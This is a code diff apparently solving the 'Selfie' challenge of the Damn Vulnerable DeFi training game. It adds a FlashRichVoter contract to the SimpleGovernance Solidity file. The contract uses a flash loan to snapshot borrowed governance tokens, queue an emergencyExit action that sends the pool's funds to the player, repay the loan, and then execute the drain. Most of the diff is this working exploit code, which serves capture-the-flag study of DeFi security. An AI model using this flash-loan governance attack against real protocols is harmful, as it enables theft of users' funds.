@@ -2,12 +2,41 @@
 pragma solidity ^0.8.0;
 
 import "../DamnValuableTokenSnapshot.sol";
-import "./ISimpleGovernance.sol"
-;
+import "./ISimpleGovernance.sol";
+import "./SelfiePool.sol";
 /**
  * @title SimpleGovernance
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
  */
+
+
+contract FlashRichVoter {
+    DamnValuableTokenSnapshot dvts;
+    ISimpleGovernance governance;
+    SelfiePool pool;
+    address player;
+
+    constructor(DamnValuableTokenSnapshot _dvts, ISimpleGovernance _sg, SelfiePool _sp) {
+        dvts = _dvts;
+        governance = _sg;
+        pool = _sp;
+        player = msg.sender;
+    }
+
+    function onFlashLoan(address sender, address, uint256, uint256, bytes calldata) public returns (bytes32){
+        dvts.snapshot();
+        governance.queueAction(address(pool), 0, abi.encodeWithSelector(pool.emergencyExit.selector, player));
+        dvts.approve(msg.sender, type(uint256).max);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function drain(uint256 id) public {
+        governance.executeAction(id);
+    }
+}
+
+
 contract SimpleGovernance is ISimpleGovernance {
 
     uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;
